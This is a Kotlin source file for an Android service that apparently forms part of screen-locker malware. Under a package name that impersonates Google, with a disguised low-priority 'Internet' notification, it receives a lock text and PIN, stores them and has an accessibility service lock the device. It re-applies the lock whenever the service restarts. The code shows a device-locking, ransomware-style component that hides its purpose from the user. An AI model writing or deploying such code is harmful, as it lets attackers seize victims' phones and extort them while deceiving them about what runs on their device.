package com.google.technology

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.content.SharedPreferences
import android.os.Build
import android.os.IBinder
import android.provider.Settings
import androidx.core.app.NotificationCompat

class LockService : Service() {

    companion object {
        @Volatile var isLocked = false

        const val ACTION_LOCK   = "com.google.technology.ACTION_LOCK"
        const val ACTION_UNLOCK = "com.google.technology.ACTION_UNLOCK"
    }

    private val CHANNEL_ID = "google_lock"
    private val NOTIF_ID   = 2

    private lateinit var prefs: SharedPreferences

    private fun isAccessibilityEnabled(): Boolean {
        val serviceId = "$packageName/${KaiserAccessibilityService::class.java.canonicalName}"
        val enabled = Settings.Secure.getString(
            contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        ) ?: return false
        return enabled.split(":").any { it.equals(serviceId, ignoreCase = true) }
    }

    private fun sendBroadcastToSelf(action: String, extras: (Intent.() -> Unit)? = null) {
        val intent = Intent(action).apply {
            setPackage(packageName)
            extras?.invoke(this)
        }
        sendBroadcast(intent)
    }

    override fun onCreate() {
        super.onCreate()
        prefs = getSharedPreferences("google", MODE_PRIVATE)
        createNotificationChannel()
        startForeground(NOTIF_ID, buildNotification())
        if (!isAccessibilityEnabled()) {
            stopForeground(true)
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            ACTION_LOCK -> {
                val lockText = intent.getStringExtra("lockText") ?: "LOCKED"
                val lockPin  = intent.getStringExtra("lockPin")  ?: "0000"
                prefs.edit().putString("lockText", lockText).putString("lockPin", lockPin).apply()
                sendBroadcastToSelf(KaiserAccessibilityService.ACTION_DO_LOCK) {
                    putExtra("lockText", lockText)
                    putExtra("lockPin", lockPin)
                }
            }
            ACTION_UNLOCK -> {
                sendBroadcastToSelf(KaiserAccessibilityService.ACTION_DO_UNLOCK)
                stopSelf()
            }
            else -> {
                val savedText = prefs.getString("lockText", null)
                val savedPin  = prefs.getString("lockPin", null)
                if (!savedText.isNullOrEmpty() && !savedPin.isNullOrEmpty()) {
                    sendBroadcastToSelf(KaiserAccessibilityService.ACTION_DO_LOCK) {
                        putExtra("lockText", savedText)
                        putExtra("lockPin", savedPin)
                    }
                }
            }
        }
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        sendBroadcastToSelf(KaiserAccessibilityService.ACTION_DO_UNLOCK)
        super.onDestroy()
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val ch = NotificationChannel(
                CHANNEL_ID, "Internet", NotificationManager.IMPORTANCE_MIN
            ).apply { description = "Status Aktif" }
            getSystemService(NotificationManager::class.java).createNotificationChannel(ch)
        }
    }

    private fun buildNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Internet")
            .setContentText("Status Aktif")
            .setSmallIcon(android.R.drawable.ic_lock_lock)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .build()
    }
}
